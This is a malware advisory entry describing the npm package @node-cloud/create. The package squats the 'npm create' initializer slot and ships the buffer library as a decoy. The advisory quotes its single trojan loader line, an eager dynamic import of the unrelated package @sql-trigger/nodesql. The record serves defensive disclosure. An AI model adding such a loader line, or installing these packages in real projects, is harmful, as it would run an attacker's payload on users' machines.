summary: @node-cloud/create scaffolding squat eagerly loads unrelated @sql-trigger/nodesql dependency
details: Package @node-cloud/create occupies the scoped `/create` slot that npm auto-resolves for `npm init node-cloud` / `npm create node-cloud`, causing this package to be fetched and executed as an initializer. Its declared purpose is 'cloud definitions for node', but the shipped index.js is the unmodified source of the unrelated `buffer` library by Feross Aboukhadijeh (author comment and feross/buffer GitHub links preserved verbatim), serving as a decoy body. The first executable statement of index.js is `var ins = import('@sql-trigger/nodesql');` — an eager, unawaited dynamic import that fires whenever the package is required, imported, or invoked via the scaffolding command, pulling in and executing whatever code `@sql-trigger/nodesql` ships. The dependency name has no connection to either the advertised 'cloud' purpose or the actual buffer-library contents; the loader-stub shape (decoy body + single side-effect import of an unrelated package) is the canonical pull-through-trojan pattern, where the dropped package contains the real payload.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
